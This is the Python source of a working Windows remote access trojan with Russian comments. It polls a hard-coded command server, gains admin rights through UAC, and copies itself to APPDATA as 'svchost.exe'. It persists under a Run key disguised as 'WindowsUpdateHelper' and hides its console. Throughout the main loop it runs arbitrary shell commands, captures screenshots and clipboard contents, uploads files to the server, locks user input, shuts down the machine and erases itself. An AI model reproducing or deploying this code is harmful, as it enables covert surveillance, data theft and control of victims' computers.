import os
import sys
import io
import time
import tempfile
import subprocess
import platform
import socket
import requests
import ctypes
import shutil
import winreg
from PIL import ImageGrab
import psutil
import urllib3
urllib3.disable_warnings()

# ================= НАСТРОЙКИ =================
SERVER_URL = "https://w6tzh3f557.apps.bot-hosting.cloud"
# =============================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Запуск от админа (UAC)
if not is_admin():
    try:
        if getattr(sys, "frozen", False):
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    except Exception:
        pass
    sys.exit()

def setup_persistence():
    try:
        if getattr(sys, "frozen", False):
            exe_path = sys.executable
            appdata = os.environ.get("APPDATA")
            dst = os.path.join(appdata, "svchost.exe")
            if os.path.abspath(exe_path) != os.path.abspath(dst):
                shutil.copy2(exe_path, dst)
            cmd_str = f'"{dst}"'
        else:
            script_path = os.path.abspath(__file__)
            python_exe = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(python_exe):
                python_exe = sys.executable
            cmd_str = f'"{python_exe}" "{script_path}"'

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, cmd_str)
        winreg.CloseKey(key)
    except:
        pass

def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass

def get_cmd():
    try:
        r = requests.get(f"{SERVER_URL}/get_cmd", timeout=10)
        return r.json().get("cmd")
    except: return None

def send_result(text):
    try:
        requests.post(f"{SERVER_URL}/post_result", json={"result": text}, timeout=10)
    except: pass

def send_doc(data, filename):
    try:
        files = {"file": (filename, data, "application/octet-stream")}
        requests.post(f"{SERVER_URL}/upload", files=files, timeout=30)
    except: pass

def sys_info():
    lines = [
        f"<b>Host:</b> {socket.gethostname()}",
        f"<b>User:</b> {os.getlogin()}",
        f"<b>OS:</b> {platform.system()} {platform.release()}",
        f"<b>Admin:</b> {'✅ Да' if is_admin() else '❌ Нет'}"
    ]
    return "\n".join(lines)

def screenshot():
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        return buf.getvalue()
    except Exception as e:
        send_result(f"❌ Ошибка скрина: {e}")
        return None

def processes():
    out = []
    for p in psutil.process_iter(['name']):
        out.append(f"• {p.info['name']}")
    return "\n".join(out[:60])

def installed_apps():
    out = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(winreg.QueryInfoKey(key)[0]):
            try:
                name = winreg.QueryValueEx(winreg.OpenKey(key, winreg.EnumKey(key, i)), "DisplayName")[0]
                out.append(f"• {name}")
            except: pass
    except: pass
    return "\n".join(out) if out else "none"

def desktop_files():
    try:
        path = os.path.join(os.environ["USERPROFILE"], "Desktop")
        return "\n".join(f"• {f}" for f in os.listdir(path)) or "empty"
    except: return "n/a"

def wipe():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsUpdateHelper")
        winreg.CloseKey(key)
    except: pass
    try:
        self_path = sys.executable if getattr(sys, "frozen", False) else __file__
        subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 2 >nul & del /f /q "{self_path}"', shell=True, creationflags=0x08000000)
        appdata = os.environ.get("APPDATA")
        if appdata:
            dst = os.path.join(appdata, "svchost.exe")
            subprocess.Popen(f'cmd /c del /f /q "{dst}"', shell=True, creationflags=0x08000000)
    except: pass
    os._exit(0)

def lock_pc():
    res = ctypes.windll.user32.BlockInput(True)
    if res:
        send_result("🔒 ПК заблокирован. Для разблокировки напиши /unlock")
    else:
        send_result("❌ Не удалось заблокировать.")

def unlock_pc():
    ctypes.windll.user32.BlockInput(False)
    send_result("🔓 ПК разблокирован.")

def main():
    setup_persistence()
    hide_console()
    send_result("✅ Агент запущен.\n" + sys_info())

    try:
        while True:
            cmd = get_cmd()
            if cmd:
                cmd = cmd.strip()
                try:
                    if cmd == "/info": send_result(sys_info())
                    elif cmd == "/screen":
                        img_data = screenshot()
                        if img_data:
                            send_doc(img_data, "screen.jpg")
                    elif cmd == "/proc": send_result("<b>Процессы:</b>\n" + processes())
                    elif cmd == "/apps": send_result("<b>Программы:</b>\n" + installed_apps())
                    elif cmd == "/desktop": send_result("<b>Рабочий стол:</b>\n" + desktop_files())
                    elif cmd.startswith("/url "): os.startfile(cmd[5:].strip()); send_result("✅ Сайт открыт.")
                    elif cmd.startswith("/open "): os.startfile(cmd[6:].strip()); send_result("✅ Программа запущена.")
                    elif cmd.startswith("/cmd "): 
                        output = subprocess.check_output(cmd[5:].strip(), shell=True, stderr=subprocess.STDOUT, text=True, encoding='cp866', errors='ignore')
                        send_result(f"<code>{output[:4000]}</code>")
                    elif cmd == "/clip":
                        import pyperclip
                        send_result(f"<b>Буфер:</b>\n<code>{pyperclip.paste()}</code>")
                    elif cmd.startswith("/download "):
                        path = cmd[10:].strip()
                        with open(path, "rb") as f: send_doc(f.read(), os.path.basename(path))
                    elif cmd == "/lock": lock_pc()
                    elif cmd == "/unlock": unlock_pc()
                    elif cmd == "/webcam": send_result("❌ Веб-камера отключена в этой сборке (Win7).")
                    elif cmd == "/mic": send_result("❌ Микрофон отключен в этой сборке (Win7).")
                    elif cmd == "/shutdown": subprocess.Popen("shutdown /s /t 0", shell=True); send_result("Выключение...")
                    elif cmd == "/reboot": subprocess.Popen("shutdown /r /t 0", shell=True); send_result("Перезагрузка...")
                    elif cmd == "/exit": wipe()
                except Exception as e:
                    send_result(f"❌ Ошибка выполнения: {e}")
            time.sleep(2)
    except Exception:
        pass

if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
